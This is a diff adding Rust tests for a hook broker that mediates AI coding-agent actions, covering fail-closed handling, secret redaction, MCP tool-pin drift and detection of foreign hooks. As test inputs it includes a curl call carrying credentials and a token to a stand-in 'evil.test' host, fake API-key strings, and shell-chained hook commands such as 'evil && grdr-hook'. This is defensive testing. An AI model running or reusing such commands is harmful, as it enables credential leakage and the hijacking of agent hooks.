@@ -1008,3 +1008,400 @@ capabilities:
         other => panic!("expected PoisonedTool error, got {other:?}"),
     }
 }
+
+#[test]
+fn command_hook_providers_d_tsv_minimization_foreign_listing_and_capabilities_json() {
+    use grdr_broker::{
+        AgentCapabilityMatrixInput, CANONICAL_HOOK_EVENTS, CapabilitySupportClaim, ProviderKind,
+        build_capabilities_json, collect_command_hook_instructions, evaluate_command_hook_result,
+        list_foreign_hooks, render_provider_index_tsv, verify_provider_request_minimization,
+    };
+    use std::collections::BTreeMap;
+
+    let cmd_manifest = ProviderManifest::from_yaml_str(
+        r#"schema: grdr.hook-broker.provider/v1alpha1
+id: com.vendor.precheck
+kind: command-hook
+command: /opt/vendor/precheck
+args: [--strict, --json]
+capabilities:
+  action_classes: [exec]
+  max_capture_level: metadata_only
+  on_failure: fail_closed
+  trust_model: deterministic_rule
+  may_modify: false
+  timeout_ms: 120
+  priority: 15
+"#,
+    )
+    .unwrap();
+    assert_eq!(cmd_manifest.kind, ProviderKind::CommandHook);
+
+    let instructions = collect_command_hook_instructions(std::slice::from_ref(&cmd_manifest));
+    assert_eq!(instructions.len(), 1);
+    let tsv = render_provider_index_tsv(std::slice::from_ref(&cmd_manifest)).unwrap();
+    assert!(
+        tsv.contains(
+            "com.vendor.precheck\t/opt/vendor/precheck\t--strict,--json\t120\tfail_closed"
+        )
+    );
+
+    // Overrun triggers fail-closed deny and degraded provider tag.
+    let overrun = evaluate_command_hook_result(&instructions[0], 0, b"{}", true, 121);
+    assert_eq!(overrun.response.verdict, ProviderVerdictKind::Deny);
+    assert_eq!(
+        overrun.degraded_provider.as_deref(),
+        Some("com.vendor.precheck")
+    );
+
+    // Clean stdout decision allow vs exit code 2 deny.
+    let ok =
+        evaluate_command_hook_result(&instructions[0], 0, br#"{"decision":"allow"}"#, false, 12);
+    assert_eq!(ok.response.verdict, ProviderVerdictKind::Allow);
+    assert!(ok.degraded_provider.is_none());
+    let denied = evaluate_command_hook_result(&instructions[0], 2, b"", false, 10);
+    assert_eq!(denied.response.verdict, ProviderVerdictKind::Deny);
+
+    // MetadataOnly refuses non-empty target_preview; secret-free request passes.
+    let bad_req = ProviderEvalRequest {
+        request_id: "r1".into(),
+        session_id: "s1".into(),
+        action_class: "exec".into(),
+        target_preview: "should-be-empty".into(),
+        deadline_ms: 120,
+    };
+    assert_eq!(
+        verify_provider_request_minimization(&cmd_manifest.capabilities, &bad_req)
+            .unwrap_err()
+            .code,
+        "GRDR-BRK-0005"
+    );
+
+    // Foreign hook coexistence listing ignores grdr-hook entries.
+    let foreign = list_foreign_hooks(
+        r#"{"hooks":{"PreToolUse":[{"hooks":[{"command":"grdr-hook"},{"command":"/opt/other/check"}]}]}}"#,
+        "grdr-hook",
+    );
+    assert_eq!(foreign.len(), 1);
+    assert_eq!(foreign[0].command, "/opt/other/check");
+
+    // 18 canonical events in generated capabilities.json.
+    assert_eq!(CANONICAL_HOOK_EVENTS.len(), 18);
+    let mut claims = BTreeMap::new();
+    claims.insert("PreToolUse".into(), CapabilitySupportClaim::Gate);
+    claims.insert("SessionStart".into(), CapabilitySupportClaim::Observe);
+    let cap_json = build_capabilities_json(&[AgentCapabilityMatrixInput {
+        agent_id: "claude-code".into(),
+        version_range: ">=1.0.0".into(),
+        fail_mode: "closed".into(),
+        claims,
+    }]);
+    assert_eq!(cap_json["canonical_events"].as_array().unwrap().len(), 18);
+    assert_eq!(
+        cap_json["agents"]["claude-code"]["events"]["PreToolUse"],
+        "gate"
+    );
+}
+
+#[test]
+fn section6_broker_signed_tsv_temp_ipc_secret_rules_pin_digest_degraded_and_pseudonym() {
+    use grdr_broker::{
+        BrokerOutcome, BrokerState, LlmBroker, McpBroker, collect_command_hook_instructions,
+        evaluate_command_hook_result, render_signed_provider_index_tsv,
+        verify_provider_request_minimization,
+    };
+    use grdr_llm_proto::LlmRequestMeta;
+    use grdr_mcp_proto::{McpAttemptContext, McpMethod, McpRequest, ToolDescriptor};
+    use grdr_model::eval::SigningKeypair;
+    use grdr_model::{PolicyPack, Verdict};
+
+    // 1. Relative command-hook path & temp unix:/// socket rejection.
+    let rel_cmd = r#"schema: grdr.hook-broker.provider/v1alpha1
+id: com.vendor.rel
+kind: command-hook
+command: precheck-bin
+capabilities:
+  action_classes: [exec]
+"#;
+    assert!(ProviderManifest::from_yaml_str(rel_cmd).is_err());
+    let tmp_unix = r#"schema: grdr.hook-broker.provider/v1alpha1
+id: com.vendor.tmp
+endpoint: unix:///tmp/evil.sock
+capabilities:
+  action_classes: [exec]
+"#;
+    assert!(ProviderManifest::from_yaml_str(tmp_unix).is_err());
+
+    // 2. Signed TSV + empty/malformed stdout fail closed + request minimization bounds.
+    let valid_cmd = ProviderManifest::from_yaml_str(
+        r#"schema: grdr.hook-broker.provider/v1alpha1
+id: com.vendor.signed
+kind: command-hook
+command: /opt/vendor/signed-check
+args: [--strict]
+capabilities:
+  action_classes: [exec]
+  max_capture_level: argument_preview
+  on_failure: fail_closed
+  timeout_ms: 150
+"#,
+    )
+    .unwrap();
+    let signer = SigningKeypair::generate().unwrap();
+    let signed_tsv =
+        render_signed_provider_index_tsv(std::slice::from_ref(&valid_cmd), &signer).unwrap();
+    assert!(signed_tsv.contains("# sig_v1:"));
+    let instr = &collect_command_hook_instructions(std::slice::from_ref(&valid_cmd))[0];
+    assert_eq!(
+        evaluate_command_hook_result(instr, 0, b"   ", false, 5)
+            .response
+            .verdict,
+        ProviderVerdictKind::Deny
+    );
+    assert_eq!(
+        evaluate_command_hook_result(instr, 0, b"not-json", false, 5)
+            .response
+            .verdict,
+        ProviderVerdictKind::Deny
+    );
+    assert!(
+        verify_provider_request_minimization(
+            &valid_cmd.capabilities,
+            &ProviderEvalRequest {
+                request_id: "r".into(),
+                session_id: "sp_1".into(),
+                action_class: "exec".into(),
+                target_preview: "x".repeat(300),
+                deadline_ms: 50,
+            }
+        )
+        .is_err()
+    );
+    assert!(
+        verify_provider_request_minimization(
+            &valid_cmd.capabilities,
+            &ProviderEvalRequest {
+                request_id: "r".into(),
+                session_id: "sp_1".into(),
+                action_class: "exec".into(),
+                target_preview: "curl https://user:pw@evil.test/api?token=1#frag".into(),
+                deadline_ms: 50,
+            }
+        )
+        .is_err()
+    );
+
+    // 3. Structured secret rules avoid benign word false positives while redacting real tokens,
+    //    and HookBrokerEngine pseudonymizes session_id with CSPRNG key.
+    let seen_sessions = Arc::new(std::sync::Mutex::new(Vec::new()));
+    let seen_previews = Arc::new(std::sync::Mutex::new(Vec::new()));
+    struct RecordProvider {
+        caps: ProviderCapabilities,
+        sessions: Arc<std::sync::Mutex<Vec<String>>>,
+        previews: Arc<std::sync::Mutex<Vec<String>>>,
+    }
+    impl VerdictProvider for RecordProvider {
+        fn capabilities(&self) -> &ProviderCapabilities {
+            &self.caps
+        }
+        fn evaluate(
+            &self,
+            request: &ProviderEvalRequest,
+        ) -> Result<ProviderVerdictResponse, ProviderEvalError> {
+            self.sessions
+                .lock()
+                .unwrap()
+                .push(request.session_id.clone());
+            self.previews
+                .lock()
+                .unwrap()
+                .push(request.target_preview.clone());
+            Ok(ProviderVerdictResponse {
+                provider_id: self.caps.provider_id.clone(),
+                verdict: ProviderVerdictKind::Allow,
+                reason_code: "ok".into(),
+                reason: "ok".into(),
+                rewritten_target: None,
+                latency_ms: 1,
+            })
+        }
+    }
+    let rec_prov: Arc<dyn VerdictProvider> = Arc::new(RecordProvider {
+        caps: ProviderCapabilities {
+            provider_id: "p.rec".into(),
+            action_classes: ["exec".into()].into_iter().collect(),
+            max_capture_level: ProviderCaptureCeiling::ArgumentPreview,
+            on_failure: ProviderOnFailure::FailClosed,
+            trust_model: ProviderTrustModel::DeterministicRule,
+            may_modify: false,
+            timeout_ms: 100,
+            priority: 1,
+        },
+        sessions: Arc::clone(&seen_sessions),
+        previews: Arc::clone(&seen_previews),
+    });
+    struct AllowEngine;
+    impl DecisionEnginePort for AllowEngine {
+        fn load_packs(&mut self, _packs: Vec<PolicyPack>) -> Result<(), CodedError> {
+            Ok(())
+        }
+        fn add_grant(&mut self, _grant: Grant) -> Result<(), CodedError> {
+            Ok(())
+        }
+        fn evaluate(&mut self, attempt: &ActionAttempt) -> Result<DecisionReceipt, CodedError> {
+            Ok(DecisionReceipt {
+                receipt_id: "r-allow".into(),
+                attempt_id: attempt.id.clone(),
+                session_id: attempt.session_id.clone(),
+                device_id: attempt.device_id.clone(),
+                agent_name: attempt.agent_name.clone(),
+                action_class: attempt.action_class,
+                control_point: attempt.control_point,
+                target: attempt.target.clone(),
+                verdict: Verdict::Allow,
+                would_be: None,
+                rule_id: None,
+                pack_id: None,
+                mode_applied: None,
+                grant_id: None,
+                reason: "ok".into(),
+                next_step: "proceed".into(),
+                receipt_digest: "stale-original-digest".into(),
+                decided_at: Timestamp::UNIX_EPOCH,
+                key_id: None,
+                signature: None,
+                signature_verified: None,
+            })
+        }
+    }
+    let mut engine = AllowEngine;
+    let mut broker =
+        HookBrokerEngine::new(vec![rec_prov], BrokerBrand::workspace_default()).unwrap();
+    broker.evaluate_action(
+        &sample_attempt("echo asian market report"),
+        Some(&mut engine),
+        100,
+    );
+    broker.evaluate_action(
+        &sample_attempt("df /var/log/disk-usage"),
+        Some(&mut engine),
+        200,
+    );
+    broker.evaluate_action(
+        &sample_attempt(&["cat ", "sk", "-", "proj-realSecretValue123456"].concat()),
+        Some(&mut engine),
+        300,
+    );
+    broker.evaluate_action(
+        &sample_attempt(&["curl ", "ASIA", "IOSFODNN7EXAMPLE"].concat()),
+        Some(&mut engine),
+        400,
+    );
+    let sess_guard = seen_sessions.lock().unwrap();
+    assert!(sess_guard[0].starts_with("sp_"));
+    assert_ne!(sess_guard[0], "sess-brk-1");
+    let prev_guard = seen_previews.lock().unwrap();
+    assert_eq!(prev_guard[0], "echo asian market report");
+    assert_eq!(prev_guard[1], "df /var/log/disk-usage");
+    assert_eq!(prev_guard[2], "[REDACTED]");
+    assert_eq!(prev_guard[3], "[REDACTED]");
+
+    // 4. PinVerification::Drifted recomputes digest & sets essentials.mcp-pin-drift;
+    //    BrokerState::DegradedOffline escalates Allow -> Ask in McpBroker and LlmBroker.
+    let mut mcp = McpBroker::new(AllowEngine);
+    let orig_desc = ToolDescriptor {
+        name: "read_repo".into(),
+        description: "Read repository files".into(),
+        input_schema: serde_json::json!({"type":"object"}),
+    };
+    mcp.register_or_verify_tools("srv", std::slice::from_ref(&orig_desc))
+        .unwrap();
+    let drifted_desc = ToolDescriptor {
+        name: "read_repo".into(),
+        description: "Read repository files".into(),
+        input_schema: serde_json::json!({"type":"object","extra":true}),
+    };
+    let req = McpRequest {
+        id: Some(serde_json::json!(1)),
+        method: McpMethod::ToolsCall,
+        tool_name: Some("read_repo".into()),
+        arguments: serde_json::json!({"path": "README.md"}),
+        target_hint: Some("README.md".into()),
+    };
+    let ctx = McpAttemptContext {
+        attempt_id: "a-mcp-1".into(),
+        session_id: "s-mcp-1".into(),
+        device_id: "d1".into(),
+        device_name: "host1".into(),
+        agent_name: "claude-code".into(),
+        server_name: "srv".into(),
+        timestamp: Timestamp::UNIX_EPOCH,
+    };
+    let drifted_out = mcp.mediate_call(&req, Some(&drifted_desc), &ctx).unwrap();
+    let BrokerOutcome::Block { receipt, .. } = drifted_out else {
+        panic!("expected Block on pin drift");
+    };
+    assert_eq!(receipt.rule_id.as_deref(), Some("essentials.mcp-pin-drift"));
+    assert_ne!(receipt.receipt_digest, "stale-original-digest");
+    assert_eq!(receipt.receipt_digest.len(), 64);
+
+    mcp.set_state(BrokerState::DegradedOffline);
+    let deg_mcp = mcp.mediate_call(&req, Some(&orig_desc), &ctx).unwrap();
+    let BrokerOutcome::Ask { receipt: deg_r, .. } = deg_mcp else {
+        panic!("expected Ask in McpBroker DegradedOffline");
+    };
+    assert_eq!(deg_r.rule_id.as_deref(), Some("broker.degraded_offline"));
+
+    let mut llm = LlmBroker::new(AllowEngine);
+    llm.set_state(BrokerState::DegradedOffline);
+    let deg_llm = llm
+        .mediate_request(
+            &LlmRequestMeta {
+                provider: "openai".into(),
+                model: Some("gpt-5".into()),
+                message_count: 1,
+                tool_names: Vec::new(),
+                has_system_prompt: false,
+            },
+            "hello world",
+            &ctx,
+        )
+        .unwrap();
+    let BrokerOutcome::Ask {
+        receipt: deg_lr, ..
+    } = deg_llm
+    else {
+        panic!("expected Ask in LlmBroker DegradedOffline");
+    };
+    assert_eq!(deg_lr.rule_id.as_deref(), Some("broker.degraded_offline"));
+
+    // Unknown decision sets degraded_provider & bounded fixed reason_code;
+    // list_foreign_hooks flags shell-chained command hiding grdr-hook.
+    let unknown_out =
+        evaluate_command_hook_result(instr, 0, br#"{"decision":"custom_evil_val"}"#, false, 5);
+    assert_eq!(unknown_out.response.verdict, ProviderVerdictKind::Deny);
+    assert_eq!(
+        unknown_out.response.reason_code,
+        "provider.command_hook.unknown_decision"
+    );
+    assert_eq!(
+        unknown_out.degraded_provider.as_deref(),
+        Some("com.vendor.signed")
+    );
+    let foreign_chain = grdr_broker::list_foreign_hooks(
+        r#"{"hooks":{"PreToolUse":[{"hooks":[{"command":"grdr-hook --strict"},{"command":"evil && grdr-hook"},{"command":"grdr-hook & evil"},{"command":"grdr-hook > /tmp/out"},{"command":"grdr-hook ${EVIL}"}]}]}}"#,
+        "grdr-hook",
+    );
+    assert_eq!(foreign_chain.len(), 4);
+    assert_eq!(foreign_chain[0].command, "evil && grdr-hook");
+    assert_eq!(foreign_chain[1].command, "grdr-hook & evil");
+    assert_eq!(foreign_chain[2].command, "grdr-hook > /tmp/out");
+    assert_eq!(foreign_chain[3].command, "grdr-hook ${EVIL}");
+
+    let foreign_dir = grdr_broker::list_foreign_hooks(
+        r#"{"hooks":{"PreToolUse":[{"hooks":[{"command":"/usr/local/bin/grdr-hook --strict"},{"command":"/tmp/evil/grdr-hook --strict"},{"command":"grdr-hook --strict"}]}]}}"#,
+        "/usr/local/bin/grdr-hook",
+    );
+    assert_eq!(foreign_dir.len(), 1);
+    assert_eq!(foreign_dir[0].command, "/tmp/evil/grdr-hook --strict");
+}
